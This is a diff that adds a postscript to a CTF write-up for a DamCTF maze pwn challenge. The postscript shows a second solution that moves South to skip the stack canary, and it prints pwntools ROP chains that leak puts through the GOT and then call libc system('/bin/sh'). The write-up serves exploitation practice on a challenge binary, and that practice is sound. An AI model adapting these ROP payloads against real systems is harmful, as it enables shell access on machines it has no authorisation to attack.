@@ -23,6 +23,8 @@ Please read [pwn/magic-marker](../magic-marker) first.  This is the same challen
 >
 > There's less than a 1 in 64 chance this will work per trial (retries are built into the code).
 
+**UPDATE: see [Postscript](#Postscript) for a second solution with a near 100% chance of success.**
+
 ## Analysis
 
 ### Checksec
@@ -574,3 +576,87 @@ Error counts:
 ```
 
 These numbers are not surprising given how many checks force a restart.       
+
+
+## Postscript
+
+User **TheBadGod[flagbot]** from DamCTF Discord #pwn pointed out that moving South to avoid the Canary was also an option, one that I didn't care to consider since I based this on a modified version of [pwn/magic-marker](../magic-marker), however it only took a few minutes to test, so why not?
+
+```
+               exploit.py                                          exploit2.py
+========================================          ===========================================
+
+        |                                                 |
++   +---+       .---------- canary                +   +---+       .------------- canary
+|   |   |      /   .------- leak                  |   |   |      /   .---------- leak
++   +   +     /   /   .---- ROP payload1          +   +   +     /   /   .------- ROP payload1
+        |    /   /   /   .- ROP payload2                  |    /   /   /   .---- ROP payload2
++---+---+   /   /   /   /                         +---+---+   /   /   /   /   .- ROP payload3 
+        |  /   /   /   /                                  |  /   /   /   /   /
++   +---+---+---+---+---+                         +   +---+---+---+---+---+---+
+      * | 1 | 2 | 3 | 4 |                               * |   | 4 | 5 | 6 | 7 |
++---+---+---+---+---+---+                         +---+---+---+---+---+---+---+
+                                                      | 1 | 2 | 3 |
+                                                      +---+---+---+
+```
+
+Above is the path taken by both exploits.  The `*` is the lower right corner of the maze.  The tiles to the South and East are 32-byte blocks, the numbers in the tiles, the path taken.
+
+The maze is stored as an array of rows.  East will move down stack 32 bytes at a time, however South will move down stack 1280 bytes.  This probably puts us around the environment area of the stack--safe to vandalize with our magic marker.
+
+By avoiding the Canary block randomization, this increases our odds of getting the flag to 1 in 4.  There's still the first part of the ROP chain to deal with, by changing the pass 1 ROP chain to use three blocks with the last 8 bytes all `0xff` and some `pop`s to move RSP down, we can be certain our forward and backwards movement will be unimpeded.
+
+New ROP chains:
+
+```
+    payload1  = b''
+    payload1 += 8 * b'\xff'
+    payload1 += p64(pop_2)
+    payload1 += 8 * b'\xff'
+    payload1 += 8 * b'\xff'
+
+    payload2  = b''
+    payload2 += p64(pop_rdi)
+    payload2 += p64(binary.got.puts)
+    payload2 += p64(pop_2)
+    payload2 += 8 * b'\xff'
+
+    payload3  = b''
+    payload3 += 8 * b'\xff'
+    payload3 += p64(binary.plt.puts)
+    payload3 += p64(binary.sym.main)
+    payload3 += 8 * b'\xff'
+```
+
+and
+    
+```
+    payload1  = b''
+    payload1 += 8 * b'\xff'
+    payload1 += p64(pop_2)
+    payload1 += 8 * b'\xff'
+    payload1 += 8 * b'\xff'
+
+    payload2  = b''
+    payload2 += p64(pop_rdi)
+    payload2 += p64(libc.search(b'/bin/sh').__next__())
+    payload2 += p64(libc.sym.system)
+    payload2 += 8 * b'\xff'
+```
+
+In both cases the first block is just a burner block, the first row cannot be used since the return address is on the second row.  Popping twice will put us just before the next block.  We can have as many blocks as we like and have no problem moving around as long as the last row is `0xff` (more precisely one nibble, but that just makes for randomization challenges again).
+
+Of 20 runs the follow conditions forced a retry:
+
+```
+      9 [CRITICAL] rand mismatch
+      1 [CRITICAL] out of time
+```
+
+The `9` for `rand mismatch` is not a surprise, this would imply a ~0.5s startup remotely.
+
+All 20 with approximately a single retry every other attempt all completed with the flag.
+      
+
+
+
